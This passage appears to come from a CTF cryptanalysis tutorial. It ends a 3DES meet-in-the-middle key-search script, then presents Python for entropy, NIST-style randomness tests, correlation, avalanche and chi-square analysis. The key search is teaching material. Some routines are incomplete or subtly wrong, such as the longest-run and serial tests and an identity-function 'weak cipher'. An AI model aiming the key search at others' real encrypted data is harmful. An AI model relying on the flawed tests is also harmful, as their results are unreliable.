            # Pattern 1: Repeated key (1-key 3DES = DES)
            key1 = k * 3
            
            # Pattern 2: Sequential (2-key mode)
            key2 = k + (i+1).to_bytes(8, 'big') + k
            
            # Pattern 3: XOR relationship
            key3 = k + bytes([a^0xff for a in k]) + k
            
            for key in [key1[:24], key2[:24], key3[:24]]:
                try:
                    cipher = DES3.new(key, DES3.MODE_ECB)
                    if cipher.encrypt(self.pt) == self.ct:
                        print(f"[+] FOUND after {i:,} attempts: {key.hex()}")
                        return True
                except:
                    pass
            
            if i % 10000 == 0 and i > 0:
                print(f"    Progress: {i:,} / {max_keys:,}")
        
        return False
    
    def try_pattern_keys(self):
        """Try keys following common patterns"""
        patterns = [
            lambda x: x.to_bytes(8, 'big') * 3,  # Repeated
            lambda x: (x.to_bytes(8, 'big') + b'\x00'*16)[:24],  # Zero-padded
            lambda x: (x.to_bytes(24, 'big')),  # Direct conversion
        ]
        
        print("[*] Trying pattern-based keys...")
        
        for pattern_func in patterns:
            for i in range(2**16):  # 65k attempts per pattern
                try:
                    key = pattern_func(i)
                    cipher = DES3.new(key[:24], DES3.MODE_ECB)
                    
                    if cipher.encrypt(self.pt) == self.ct:
                        print(f"[+] FOUND: {key.hex()}")
                        return True
                except:
                    pass
        
        return False

# Example usage
if __name__ == "__main__":
    pt = b"PLAINTXT" * 2  # 16 bytes
    ct = bytes.fromhex("...ciphertext_here...")
    
    attacker = AutoMITM(pt, ct)
    # attacker.run_all_attacks()
```

**Key Takeaways**:

1. **Double Encryption**: MITM reduces security from 2^(2n) to 2^(n+1)
2. **3DES 2-key**: Vulnerable to MITM, effective security ~80 bits (deprecated)
3. **3DES 3-key**: Resists MITM but has 64-bit blocks (Sweet32 vulnerability)
4. **CTF Context**: Usually involves reduced keyspaces or implementation weaknesses
5. **Modern Recommendation**: Use AES; 3DES is deprecated/prohibited in modern protocols

---

## Statistical Analysis in CTF Cryptanalysis

### Entropy Calculation

**Shannon Entropy Theory**

Shannon entropy measures the average information content or uncertainty in a data source. For a discrete random variable X with possible values {x₁, x₂, ..., xₙ} and probability mass function P(X):

```
H(X) = -Σ P(xᵢ) log₂ P(xᵢ)
```

Maximum entropy for n symbols = log₂(n) bits per symbol.

**Basic Entropy Implementation**

```python
import math
from collections import Counter

def calculate_entropy(data):
    """
    Calculate Shannon entropy of data
    
    Args:
        data: bytes, string, or list of values
    
    Returns:
        Entropy in bits per symbol
    """
    if not data:
        return 0.0
    
    # Count frequency of each symbol
    counter = Counter(data)
    length = len(data)
    
    # Calculate probability for each symbol
    entropy = 0.0
    for count in counter.values():
        probability = count / length
        if probability > 0:
            entropy -= probability * math.log2(probability)
    
    return entropy

# Example usage
plaintext = b"HELLO WORLD"
ciphertext = bytes.fromhex("a3f5b9c2e1d4f7a8b3c6e9f2")

print(f"Plaintext entropy: {calculate_entropy(plaintext):.4f} bits/byte")
print(f"Ciphertext entropy: {calculate_entropy(ciphertext):.4f} bits/byte")
print(f"Maximum entropy (8-bit): {math.log2(256):.4f} bits/byte")
```

**Entropy for Different Data Types**

```python
def byte_entropy(data):
    """Calculate entropy treating data as byte sequence"""
    if isinstance(data, str):
        data = data.encode()
    return calculate_entropy(data)

def bit_entropy(data):
    """Calculate entropy at bit level"""
    if isinstance(data, str):
        data = data.encode()
    
    # Convert to bits
    bits = []
    for byte in data:
        for i in range(8):
            bits.append((byte >> i) & 1)
    
    return calculate_entropy(bits)

def block_entropy(data, block_size):
    """
    Calculate entropy of fixed-size blocks
    Useful for detecting patterns in block ciphers
    """
    if isinstance(data, str):
        data = data.encode()
    
    blocks = []
    for i in range(0, len(data), block_size):
        block = data[i:i+block_size]
        if len(block) == block_size:
            blocks.append(block)
    
    return calculate_entropy(blocks)

# Example usage
test_data = b"AAAABBBBCCCCDDDD" * 10

print(f"Byte entropy: {byte_entropy(test_data):.4f}")
print(f"Bit entropy: {bit_entropy(test_data):.4f}")
print(f"Block entropy (4 bytes): {block_entropy(test_data, 4):.4f}")
```

**Conditional Entropy**

```python
def conditional_entropy(data, condition_length=1):
    """
    Calculate conditional entropy H(X|Y)
    Measures predictability based on previous symbols
    
    [Inference: Lower conditional entropy suggests patterns/dependencies]
    """
    if len(data) <= condition_length:
        return 0.0
    
    # Count transitions
    transitions = {}
    for i in range(len(data) - condition_length):
        context = tuple(data[i:i+condition_length])
        next_symbol = data[i+condition_length]
        
        if context not in transitions:
            transitions[context] = []
        transitions[context].append(next_symbol)
    
    # Calculate conditional entropy
    total_entropy = 0.0
    total_count = 0
    
    for context, next_symbols in transitions.items():
        context_entropy = calculate_entropy(next_symbols)
        context_count = len(next_symbols)
        total_entropy += context_entropy * context_count
        total_count += context_count
    
    return total_entropy / total_count if total_count > 0 else 0.0

# Example: Detect patterns
random_data = bytes([random.randint(0, 255) for _ in range(1000)])
pattern_data = b"ABCD" * 250

print(f"Random data conditional entropy: {conditional_entropy(random_data):.4f}")
print(f"Pattern data conditional entropy: {conditional_entropy(pattern_data):.4f}")
```

**File Entropy Analysis**

```python
def analyze_file_entropy(filename, block_size=256):
    """
    Analyze entropy across file in blocks
    Useful for detecting encrypted sections
    """
    with open(filename, 'rb') as f:
        data = f.read()
    
    entropies = []
    for i in range(0, len(data), block_size):
        block = data[i:i+block_size]
        if len(block) >= block_size // 2:  # Minimum block size
            ent = calculate_entropy(block)
            entropies.append({
                'offset': i,
                'entropy': ent,
                'block': block
            })
    
    return entropies

def plot_entropy_distribution(entropies):
    """
    Visualize entropy distribution
    [Inference: High entropy regions may indicate encryption/compression]
    """
    print("Entropy Distribution:")
    print(f"{'Offset':<10} {'Entropy':<10} {'Visual'}")
    print("-" * 50)
    
    for entry in entropies:
        offset = entry['offset']
        entropy = entry['entropy']
        bar_length = int(entropy / 8.0 * 40)
        bar = '█' * bar_length
        print(f"{offset:<10} {entropy:<10.4f} {bar}")
    
    # Statistics
    ents = [e['entropy'] for e in entropies]
    avg_entropy = sum(ents) / len(ents)
    max_entropy = max(ents)
    min_entropy = min(ents)
    
    print(f"\nAverage: {avg_entropy:.4f}")
    print(f"Max: {max_entropy:.4f}")
    print(f"Min: {min_entropy:.4f}")

# Example usage
import random

# Create test file with mixed content
test_data = b"Plain text section " * 50  # Low entropy
test_data += bytes([random.randint(0, 255) for _ in range(500)])  # High entropy
test_data += b"AAAA" * 100  # Very low entropy

with open('test_entropy.bin', 'wb') as f:
    f.write(test_data)

entropies = analyze_file_entropy('test_entropy.bin', block_size=100)
plot_entropy_distribution(entropies[:10])  # Show first 10 blocks
```

**Entropy Rate Calculation**

```python
def entropy_rate(data, max_order=5):
    """
    Calculate entropy rate: lim(n→∞) H(Xₙ|X₁...Xₙ₋₁)
    Approximated using conditional entropy at different orders
    
    [Inference: Measures inherent randomness after removing predictable patterns]
    """
    if len(data) < max_order + 1:
        return calculate_entropy(data)
    
    rates = []
    for order in range(1, max_order + 1):
        cond_ent = conditional_entropy(data, order)
        rates.append({
            'order': order,
            'conditional_entropy': cond_ent
        })
    
    return rates

# Example
test_sequence = b"The quick brown fox jumps over the lazy dog" * 20
rates = entropy_rate(test_sequence)

print("Entropy Rate Analysis:")
for rate in rates:
    print(f"Order {rate['order']}: {rate['conditional_entropy']:.4f} bits/symbol")
```

### Randomness Testing

**NIST Statistical Test Suite Concepts**

[Unverified: Full NIST SP 800-22 implementation requires extensive testing framework]

**Frequency (Monobit) Test**

```python
def frequency_test(bits):
    """
    NIST Frequency Test: Tests proportion of 0s and 1s
    
    Args:
        bits: list/array of binary values (0 or 1)
    
    Returns:
        p-value (should be > 0.01 for randomness)
    """
    import math
    from scipy import special
    
    n = len(bits)
    
    # Sum of bits (treating 0 as -1, 1 as +1)
    s = sum([1 if b else -1 for b in bits])
    
    # Test statistic
    s_obs = abs(s) / math.sqrt(n)
    
    # P-value using complementary error function
    p_value = special.erfc(s_obs / math.sqrt(2))
    
    return p_value

# Example
random_bits = [random.randint(0, 1) for _ in range(1000)]
biased_bits = [0] * 600 + [1] * 400

print(f"Random bits p-value: {frequency_test(random_bits):.4f}")
print(f"Biased bits p-value: {frequency_test(biased_bits):.4f}")
print("(p-value > 0.01 suggests randomness)")
```

**Block Frequency Test**

```python
def block_frequency_test(bits, block_size=128):
    """
    NIST Block Frequency Test
    Tests proportion of 1s within blocks
    """
    import math
    from scipy import stats
    
    n = len(bits)
    num_blocks = n // block_size
    
    if num_blocks == 0:
        return None
    
    # Calculate proportion of 1s in each block
    proportions = []
    for i in range(num_blocks):
        block = bits[i*block_size:(i+1)*block_size]
        proportion = sum(block) / block_size
        proportions.append(proportion)
    
    # Chi-square statistic
    chi_square = 4 * block_size * sum([(p - 0.5)**2 for p in proportions])
    
    # P-value
    p_value = stats.chi2.sf(chi_square, num_blocks)
    
    return p_value

# Example
random_bits = [random.randint(0, 1) for _ in range(10000)]
p_value = block_frequency_test(random_bits)
print(f"Block frequency test p-value: {p_value:.4f}")
```

**Runs Test**

```python
def runs_test(bits):
    """
    NIST Runs Test: Tests oscillation between 0s and 1s
    A run is an uninterrupted sequence of identical bits
    """
    import math
    from scipy import special
    
    n = len(bits)
    
    # Pre-test: frequency should be approximately 1/2
    proportion = sum(bits) / n
    tau = 2 / math.sqrt(n)
    
    if abs(proportion - 0.5) >= tau:
        return 0.0  # Failed pre-test
    
    # Count runs
    runs = 1
    for i in range(1, n):
        if bits[i] != bits[i-1]:
            runs += 1
    
    # Expected runs
    pi = proportion
    expected_runs = 2 * n * pi * (1 - pi) + 1
    
    # Test statistic
    numerator = abs(runs - expected_runs)
    denominator = 2 * math.sqrt(2 * n) * pi * (1 - pi)
    
    if denominator == 0:
        return 0.0
    
    test_stat = numerator / denominator
    
    # P-value
    p_value = special.erfc(test_stat / math.sqrt(2))
    
    return p_value

# Example
alternating_bits = [i % 2 for i in range(1000)]
random_bits = [random.randint(0, 1) for _ in range(1000)]

print(f"Alternating pattern p-value: {runs_test(alternating_bits):.6f}")
print(f"Random bits p-value: {runs_test(random_bits):.4f}")
```

**Longest Run Test**

```python
def longest_run_test(bits):
    """
    NIST Longest Run of Ones Test
    Tests the longest run of consecutive 1s
    """
    from scipy import stats
    
    n = len(bits)
    
    # Find longest run of 1s
    current_run = 0
    longest_run = 0
    
    for bit in bits:
        if bit == 1:
            current_run += 1
            longest_run = max(longest_run, current_run)
        else:
            current_run = 0
    
    # Expected longest run (approximation)
    expected_longest = math.log2(n)
    
    # Chi-square test
    # [Inference: Simplified version; full NIST test uses specific block sizes]
    if n >= 128:
        # Define categories based on block size
        if n >= 6272:
            K = 5
            M = 10000
            v_values = [10, 11, 12, 13, 14]
        elif n >= 750:
            K = 4
            M = 1000
            v_values = [8, 9, 10, 11]
        else:
            K = 3
            M = 100
            v_values = [4, 5, 6]
        
        # Simplified calculation
        observed_freq = [0] * (K + 1)
        # Count runs in each category
        # [Unverified: Full implementation requires block-wise analysis]
        
    print(f"Longest run: {longest_run}")
    print(f"Expected (log₂n): {expected_longest:.2f}")
    
    return longest_run

# Example
random_bits = [random.randint(0, 1) for _ in range(1000)]
longest = longest_run_test(random_bits)
```

**Serial Test (Two-bit patterns)**

```python
def serial_test(bits):
    """
    NIST Serial Test: Tests frequency of overlapping patterns
    Examines 2-bit patterns (00, 01, 10, 11)
    """
    from scipy import stats
    
    n = len(bits)
    
    # Count 2-bit patterns
    patterns = {'00': 0, '01': 0, '10': 0, '11': 0}
    
    for i in range(n - 1):
        pattern = str(bits[i]) + str(bits[i+1])
        patterns[pattern] += 1
    
    # Count 1-bit patterns
    ones = sum(bits)
    zeros = n - ones
    
    # Calculate psi_m values
    psi_2 = 0
    for count in patterns.values():
        psi_2 += count * count
    psi_2 = (4 / (n - 1)) * psi_2 - (2 / n) * n + 1
    
    psi_1 = (2 / n) * (ones * ones + zeros * zeros) - 1
    psi_0 = 1
    
    # Test statistics
    delta_1 = psi_2 - psi_1
    delta_2 = psi_2 - 2 * psi_1 + psi_0
    
    # P-values
    p_value1 = stats.chi2.sf(delta_1, 2)
    p_value2 = stats.chi2.sf(delta_2, 1)
    
    return {
        'patterns': patterns,
        'p_value1': p_value1,
        'p_value2': p_value2
    }

# Example
random_bits = [random.randint(0, 1) for _ in range(1000)]
result = serial_test(random_bits)

print("Pattern frequencies:", result['patterns'])
print(f"P-value 1: {result['p_value1']:.4f}")
print(f"P-value 2: {result['p_value2']:.4f}")
```

**Comprehensive Randomness Test Suite**

```python
def bytes_to_bits(data):
    """Convert bytes to bit array"""
    bits = []
    for byte in data:
        for i in range(8):
            bits.append((byte >> (7-i)) & 1)
    return bits

def comprehensive_randomness_test(data, verbose=True):
    """
    Run multiple randomness tests on data
    
    Returns:
        Dictionary with test results and overall assessment
    """
    if isinstance(data, (bytes, bytearray)):
        bits = bytes_to_bits(data)
    else:
        bits = data
    
    results = {
        'bit_count': len(bits),
        'byte_entropy': calculate_entropy(data) if isinstance(data, (bytes, bytearray)) else None,
        'tests': {}
    }
    
    # Run tests
    try:
        results['tests']['frequency'] = frequency_test(bits)
    except Exception as e:
        results['tests']['frequency'] = None
        if verbose:
            print(f"Frequency test error: {e}")
    
    try:
        results['tests']['block_frequency'] = block_frequency_test(bits)
    except Exception as e:
        results['tests']['block_frequency'] = None
        if verbose:
            print(f"Block frequency test error: {e}")
    
    try:
        results['tests']['runs'] = runs_test(bits)
    except Exception as e:
        results['tests']['runs'] = None
        if verbose:
            print(f"Runs test error: {e}")
    
    try:
        serial_result = serial_test(bits)
        results['tests']['serial'] = serial_result['p_value1']
    except Exception as e:
        results['tests']['serial'] = None
        if verbose:
            print(f"Serial test error: {e}")
    
    # Overall assessment
    threshold = 0.01
    passed_tests = sum(1 for p in results['tests'].values() 
                      if p is not None and p >= threshold)
    total_tests = sum(1 for p in results['tests'].values() if p is not None)
    
    results['passed_tests'] = passed_tests
    results['total_tests'] = total_tests
    results['is_random'] = passed_tests == total_tests if total_tests > 0 else False
    
    if verbose:
        print(f"\nRandomness Test Results:")
        print(f"Bit count: {results['bit_count']}")
        if results['byte_entropy']:
            print(f"Byte entropy: {results['byte_entropy']:.4f}")
        print(f"\nTest Results (p-value > 0.01 suggests randomness):")
        for test_name, p_value in results['tests'].items():
            if p_value is not None:
                status = "PASS" if p_value >= threshold else "FAIL"
                print(f"  {test_name:20s}: {p_value:.6f} [{status}]")
        print(f"\nOverall: {passed_tests}/{total_tests} tests passed")
        print(f"Assessment: {'RANDOM' if results['is_random'] else 'NOT RANDOM'}")
    
    return results

# Example usage
import random

# Test with truly random data
random_data = bytes([random.randint(0, 255) for _ in range(1000)])
print("=== Testing Random Data ===")
comprehensive_randomness_test(random_data)

# Test with patterned data
pattern_data = b"ABCD" * 250
print("\n=== Testing Patterned Data ===")
comprehensive_randomness_test(pattern_data)
```

### Correlation Analysis

**Auto-correlation**

```python
def autocorrelation(data, max_lag=None):
    """
    Calculate autocorrelation function
    Measures correlation of signal with delayed copy of itself
    
    [Inference: High autocorrelation at non-zero lags indicates patterns]
    """
    import numpy as np
    
    if isinstance(data, (bytes, bytearray)):
        data = np.array(list(data), dtype=float)
    else:
        data = np.array(data, dtype=float)
    
    n = len(data)
    if max_lag is None:
        max_lag = min(n // 2, 100)
    
    # Normalize data (mean = 0)
    data_normalized = data - np.mean(data)
    variance = np.var(data)
    
    if variance == 0:
        return [1.0] * max_lag
    
    autocorr = []
    for lag in range(max_lag):
        if lag == 0:
            autocorr.append(1.0)
        else:
            correlation = np.sum(data_normalized[:-lag] * data_normalized[lag:])
            correlation /= ((n - lag) * variance)
            autocorr.append(correlation)
    
    return autocorr

def plot_autocorrelation(autocorr, threshold=0.05):
    """
    Visualize autocorrelation function
    """
    print("Autocorrelation Function:")
    print(f"{'Lag':<10} {'Correlation':<15} {'Visual'}")
    print("-" * 60)
    
    for lag, corr in enumerate(autocorr):
        bar_length = int(abs(corr) * 40)
        bar = '█' * bar_length
        significance = "*" if abs(corr) > threshold and lag > 0 else ""
        print(f"{lag:<10} {corr:< 15.4f} {bar} {significance}")
    
    # Identify significant lags
    significant_lags = [lag for lag, corr in enumerate(autocorr) 
                       if abs(corr) > threshold and lag > 0]
    
    if significant_lags:
        print(f"\nSignificant correlations at lags: {significant_lags}")
        print("[Inference: May indicate periodicity or patterns]")
    else:
        print("\nNo significant autocorrelations found")
        print("[Inference: Suggests good randomness properties]")

# Example usage
import numpy as np

# Random data (should have low autocorrelation)
random_data = bytes([random.randint(0, 255) for _ in range(500)])
autocorr_random = autocorrelation(random_data, max_lag=20)

print("=== Random Data ===")
plot_autocorrelation(autocorr_random)

# Periodic data (should have high autocorrelation)
period = 8
periodic_data = bytes([(i % period) * 32 for i in range(500)])
autocorr_periodic = autocorrelation(periodic_data, max_lag=20)

print("\n=== Periodic Data ===")
plot_autocorrelation(autocorr_periodic)
```

**Cross-correlation**

```python
def cross_correlation(data1, data2, max_lag=None):
    """
    Calculate cross-correlation between two sequences
    Useful for detecting relationships between plaintext and ciphertext
    
    [Inference: High cross-correlation suggests weak encryption]
    """
    import numpy as np
    
    # Convert to numpy arrays
    if isinstance(data1, (bytes, bytearray)):
        data1 = np.array(list(data1), dtype=float)
    else:
        data1 = np.array(data1, dtype=float)
    
    if isinstance(data2, (bytes, bytearray)):
        data2 = np.array(list(data2), dtype=float)
    else:
        data2 = np.array(data2, dtype=float)
    
    n = min(len(data1), len(data2))
    if max_lag is None:
        max_lag = min(n // 4, 50)
    
    # Normalize
    data1_norm = (data1[:n] - np.mean(data1[:n])) / (np.std(data1[:n]) + 1e-10)
    data2_norm = (data2[:n] - np.mean(data2[:n])) / (np.std(data2[:n]) + 1e-10)
    
    cross_corr = []
    for lag in range(-max_lag, max_lag + 1):
        if lag < 0:
            correlation = np.sum(data1_norm[-lag:] * data2_norm[:lag]) / (n + lag)
        elif lag > 0:
            correlation = np.sum(data1_norm[:-lag] * data2_norm[lag:]) / (n - lag)
        else:
            correlation = np.sum(data1_norm * data2_norm) / n
        
        cross_corr.append(correlation)
    
    return cross_corr, range(-max_lag, max_lag + 1)

def analyze_plaintext_ciphertext_correlation(plaintext, ciphertext):
    """
    Analyze correlation between plaintext and ciphertext
    [Inference: Strong correlation indicates weak cipher]
    """
    cross_corr, lags = cross_correlation(plaintext, ciphertext, max_lag=10)
    
    print("Plaintext-Ciphertext Cross-Correlation:")
    print(f"{'Lag':<10} {'Correlation':<15}")
    print("-" * 30)
    
    max_corr = 0
    max_lag = 0
    
    for lag, corr in zip(lags, cross_corr):
        print(f"{lag:<10} {corr:< 15.4f}")
        if abs(corr) > abs(max_corr):
            max_corr = corr
            max_lag = lag
    
    print(f"\nMaximum correlation: {max_corr:.4f} at lag {max_lag}")
    
    if abs(max_corr) > 0.3:
        print("[WARNING: High correlation detected - weak encryption]")
    else:
        print("[OK: Low correlation - encryption appears strong]")
    
    return max_corr, max_lag

# Example usage
plaintext = b"The quick brown fox jumps over the lazy dog" * 5

# Weak cipher (XOR with repeating key)
weak_key = b"KEY"
weak_ciphertext = bytes([p ^ weak_key[i % len(weak_key)] 
                         for i, p in enumerate(plaintext)])

print("=== Weak Cipher Analysis ===")
analyze_plaintext_ciphertext_correlation(plaintext, weak_ciphertext)

# Strong cipher (simulated random)
strong_ciphertext = bytes([random.randint(0, 255) for _ in range(len(plaintext))])

print("\n=== Strong Cipher Analysis ===")
analyze_plaintext_ciphertext_correlation(plaintext, strong_ciphertext)
```

**Pearson Correlation Coefficient**

```python
def pearson_correlation(x, y):
    """
    Calculate Pearson correlation coefficient
    Measures linear correlation between two variables
    
    Returns:
        r: correlation coefficient (-1 to 1)
        [Inference: |r| close to 1 indicates strong linear relationship]
    """
    import numpy as np
    
    if isinstance(x, (bytes, bytearray)):
        x = np.array(list(x), dtype=float)
    else:
        x = np.array(x, dtype=float)
    
    if isinstance(y, (bytes, bytearray)):
        y = np.array(list(y), dtype=float)
    else:
        y = np.array(y, dtype=float)
    
    n = min(len(x), len(y))
    x = x[:n]
    y = y[:n]
    
    # Calculate means
    mean_x = np.mean(x)
    mean_y = np.mean(y)
    
    # Calculate correlation coefficient
    numerator = np.sum((x - mean_x) * (y - mean_y))
    denominator = np.sqrt(np.sum((x - mean_x)**2) * np.sum((y - mean_y)**2))
    
    if denominator == 0:
        return 0.0
    
    r = numerator / denominator
    
    return r

def correlation_matrix(datasets, labels=None):
    """
    Calculate correlation matrix for multiple datasets
    """
    n = len(datasets)
    matrix = [[0.0] * n for _ in range(n)]
    
    for i in range(n):
        for j in range(n):
            matrix[i][j] = pearson_correlation(datasets[i], datasets[j])
    
    # Print matrix
    if labels is None:
        labels = [f"Data{i}" for i in range(n)]
    
    print("\nCorrelation Matrix:")
    print(f"{'':15}", end="")
    for label in labels:
        print(f"{label:>15}", end="")
    print()
    
    for i, label in enumerate(labels):
        print(f"{label:15}", end="")
        for j in range(n):
            print(f"{matrix[i][j]:>15.4f}", end="")
        print()
    
    return matrix

# Example usage
data1 = bytes([i % 256 for i in range(100)])
data2 = bytes([(i * 2) % 256 for i in range(100)])
data3 = bytes([random.randint(0, 255) for _ in range(100)])

datasets = [data1, data2, data3]
labels = ["Linear", "2x Linear", "Random"]

correlation_matrix(datasets, labels)
```

**Bitwise Correlation Analysis**

```python
def bitwise_correlation_analysis(data1, data2):
    """
    Analyze correlation at individual bit positions
    Useful for detecting weak bit diffusion in ciphers
    """
    import numpy as np
    
    if len(data1) != len(data2):
        min_len = min(len(data1), len(data2))
        data1 = data1[:min_len]
        data2 = data2[:min_len]
    
    correlations = []
    
    for bit_pos in range(8):
        # Extract specific bit position from all bytes
        bits1 = [(byte >> bit_pos) & 1 for byte in data1]
        bits2 = [(byte >> bit_pos) & 1 for byte in data2]
        
        # Calculate correlation for this bit position
        corr = pearson_correlation(bits1, bits2)
        correlations.append(corr)
    
    print("Bit-wise Correlation Analysis:")
    print(f"{'Bit Position':<15} {'Correlation':<15}")
    print("-" * 30)
    
    for bit_pos, corr in enumerate(correlations):
        print(f"{bit_pos:<15} {corr:< 15.4f}")
    
    avg_corr = np.mean([abs(c) for c in correlations])
    print(f"\nAverage absolute correlation: {avg_corr:.4f}")
    
    if avg_corr > 0.2:
        print("[WARNING: High bit-wise correlation detected]")
    else:
        print("[OK: Low bit-wise correlation]")
    
    return correlations

# Example
plaintext = bytes([random.randint(0, 255) for _ in range(1000)])
# Weak cipher that doesn't affect LSB
weak_cipher = bytes([b & 0xFE | (b & 1) for b in plaintext])

print("=== Bit-wise Correlation (Weak Cipher) ===")
bitwise_correlation_analysis(plaintext, weak_cipher)
```

**Hamming Distance Analysis**

```python
def hamming_distance(data1, data2):
    """
    Calculate Hamming distance between two byte sequences
    Counts number of differing bits
    """
    if len(data1) != len(data2):
        raise ValueError("Data must be same length")
    
    distance = 0
    for b1, b2 in zip(data1, data2):
        xor = b1 ^ b2
        distance += bin(xor).count('1')
    
    return distance

def hamming_distance_distribution(data_pairs):
    """
    Analyze distribution of Hamming distances
    Useful for avalanche effect analysis
    """
    from collections import Counter
    
    distances = []
    for data1, data2 in data_pairs:
        dist = hamming_distance(data1, data2)
        distances.append(dist)
    
    counter = Counter(distances)
    total = len(distances)
    
    print("Hamming Distance Distribution:")
    print(f"{'Distance':<15} {'Count':<10} {'Percentage':<15} {'Visual'}")
    print("-" * 70)
    
    for dist in sorted(counter.keys()):
        count = counter[dist]
        percentage = (count / total) * 100
        bar_length = int(percentage / 2)
        bar = '█' * bar_length
        print(f"{dist:<15} {count:<10} {percentage:<15.2f}% {bar}")
    
    # Statistics
    mean_dist = sum(distances) / len(distances)
    max_bits = len(data_pairs[0][0]) * 8
    
    print(f"\nMean Hamming distance: {mean_dist:.2f}")
    print(f"Expected for random (50%): {max_bits / 2:.2f}")
    print(f"Observed percentage: {(mean_dist / max_bits) * 100:.2f}%")
    
    return distances

def avalanche_effect_test(cipher_func, num_tests=100, block_size=16):
    """
    Test avalanche effect: single bit change should affect ~50% of output bits
    
    [Inference: Good ciphers exhibit strong avalanche effect]
    """
    pairs = []
    
    for _ in range(num_tests):
        # Generate random input
        original = bytes([random.randint(0, 255) for _ in range(block_size)])
        
        # Flip random bit
        byte_pos = random.randint(0, block_size - 1)
        bit_pos = random.randint(0, 7)
        modified = bytearray(original)
        modified[byte_pos] ^= (1 << bit_pos)
        modified = bytes(modified)
        
        # Encrypt both
        cipher1 = cipher_func(original)
        cipher2 = cipher_func(modified)
        
        pairs.append((cipher1, cipher2))
    
    print(f"Avalanche Effect Test ({num_tests} samples):")
    print(f"Block size: {block_size} bytes ({block_size * 8} bits)\n")
    
    distances = hamming_distance_distribution(pairs)
    
    return distances

# Example usage
def weak_cipher(data):
    """Weak cipher: simple XOR with fixed key (poor avalanche)"""
    key = b"\xAA" * len(data)
    return bytes([a ^ b for a, b in zip(data, key)])

def strong_cipher_sim(data):
    """Simulated strong cipher: random output (good avalanche)"""
    import hashlib
    return hashlib.sha256(data).digest()[:len(data)]

print("=== Weak Cipher Avalanche Test ===")
avalanche_effect_test(weak_cipher, num_tests=50, block_size=8)

print("\n=== Strong Cipher Avalanche Test ===")
avalanche_effect_test(strong_cipher_sim, num_tests=50, block_size=8)
```

**Mutual Information**

```python
def mutual_information(x, y, bins=256):
    """
    Calculate mutual information I(X;Y)
    Measures reduction in uncertainty of X given Y
    
    I(X;Y) = H(X) + H(Y) - H(X,Y)
    
    [Inference: High mutual information suggests dependence]
    """
    import numpy as np
    from collections import Counter
    
    if isinstance(x, (bytes, bytearray)):
        x = list(x)
    if isinstance(y, (bytes, bytearray)):
        y = list(y)
    
    n = min(len(x), len(y))
    x = x[:n]
    y = y[:n]
    
    # Calculate individual entropies
    h_x = calculate_entropy(x)
    h_y = calculate_entropy(y)
    
    # Calculate joint entropy H(X,Y)
    joint_counter = Counter(zip(x, y))
    joint_probs = [count / n for count in joint_counter.values()]
    h_xy = -sum(p * math.log2(p) for p in joint_probs if p > 0)
    
    # Mutual information
    mi = h_x + h_y - h_xy
    
    return {
        'mutual_information': mi,
        'H(X)': h_x,
        'H(Y)': h_y,
        'H(X,Y)': h_xy,
        'normalized_mi': mi / min(h_x, h_y) if min(h_x, h_y) > 0 else 0
    }

# Example usage
plaintext = bytes([random.randint(0, 255) for _ in range(1000)])

# Weak relationship (XOR with short key)
weak_key = b"KEY"
weak_ciphertext = bytes([p ^ weak_key[i % len(weak_key)] 
                         for i, p in enumerate(plaintext)])

# Strong cipher (random)
strong_ciphertext = bytes([random.randint(0, 255) for _ in range(1000)])

print("=== Mutual Information Analysis ===\n")

print("Weak Cipher (XOR with repeating key):")
mi_weak = mutual_information(plaintext, weak_ciphertext)
for key, value in mi_weak.items():
    print(f"  {key}: {value:.4f}")

print("\nStrong Cipher (random):")
mi_strong = mutual_information(plaintext, strong_ciphertext)
for key, value in mi_strong.items():
    print(f"  {key}: {value:.4f}")

print("\n[Inference: Lower mutual information indicates stronger encryption]")
```

**Chi-Square Test for Uniformity**

```python
def chi_square_test(data, expected_uniform=True):
    """
    Chi-square test for uniform distribution
    Tests if byte frequencies deviate significantly from uniform
    
    Returns:
        chi_square: test statistic
        p_value: probability (> 0.05 suggests uniform distribution)
    """
    from scipy import stats
    from collections import Counter
    
    if isinstance(data, (bytes, bytearray)):
        data = list(data)
    
    # Count frequencies
    counter = Counter(data)
    observed_frequencies = [counter.get(i, 0) for i in range(256)]
    
    # Expected frequencies (uniform)
    n = len(data)
    expected_frequency = n / 256
    expected_frequencies = [expected_frequency] * 256
    
    # Chi-square statistic
    chi_square = sum((obs - exp)**2 / exp 
                     for obs, exp in zip(observed_frequencies, expected_frequencies)
                     if exp > 0)
    
    # Degrees of freedom
    df = 255  # 256 categories - 1
    
    # P-value
    p_value = stats.chi2.sf(chi_square, df)
    
    return {
        'chi_square': chi_square,
        'p_value': p_value,
        'df': df,
        'is_uniform': p_value > 0.05
    }

def analyze_byte_distribution(data, show_histogram=True):
    """
    Comprehensive analysis of byte distribution
    """
    from collections import Counter
    
    result = chi_square_test(data)
    
    print("Byte Distribution Analysis:")
    print(f"Sample size: {len(data)}")
    print(f"Chi-square statistic: {result['chi_square']:.2f}")
    print(f"Degrees of freedom: {result['df']}")
    print(f"P-value: {result['p_value']:.6f}")
    print(f"Is uniform: {result['is_uniform']} (p > 0.05)")
    
    if show_histogram:
        counter = Counter(data)
        max_count = max(counter.values()) if counter else 1
        
        print("\nByte Frequency Histogram (top 20):")
        print(f"{'Byte':<10} {'Count':<10} {'Visual'}")
        print("-" * 50)
        
        for byte_val, count in counter.most_common(20):
            bar_length = int((count / max_count) * 30)
            bar = '█' * bar_length
            print(f"0x{byte_val:02X} ({byte_val:3d}) {count:<10} {bar}")
    
    return result

# Example usage
print("=== Random Data (Expected Uniform) ===")
random_data = bytes([random.randint(0, 255) for _ in range(10000)])
analyze_byte_distribution(random_data, show_histogram=False)

print("\n=== Biased Data (Expected Non-Uniform) ===")
biased_data = bytes([random.choice([0, 1, 2, 3]) for _ in range(10000)])
analyze_byte_distribution(biased_data, show_histogram=False)
```

**Index of Coincidence**

```python
def index_of_coincidence(data):
    """
    Calculate Index of Coincidence (IoC)
    Measures probability that two randomly selected characters are identical
    
    IoC = Σ(fᵢ(fᵢ-1)) / (n(n-1))
    
    Expected values:
    - English text: ~0.065-0.067
    - Random/encrypted: ~0.0385 (1/26 for alphabet, 1/256 for bytes)
    
    [Inference: High IoC suggests non-random pattern or language structure]
    """
    from collections import Counter
    
    if isinstance(data, str):
        data = data.upper().replace(' ', '')
        data = [c for c in data if c.isalpha()]
    
    n = len(data)
    if n < 2:
        return 0.0
    
    # Count frequencies
    counter = Counter(data)
    
    # Calculate IoC
    numerator = sum(freq * (freq - 1) for freq in counter.values())
    denominator = n * (n - 1)
    
    ioc = numerator / denominator if denominator > 0 else 0.0
    
    return ioc

def analyze_ioc(data, data_type='bytes'):
    """
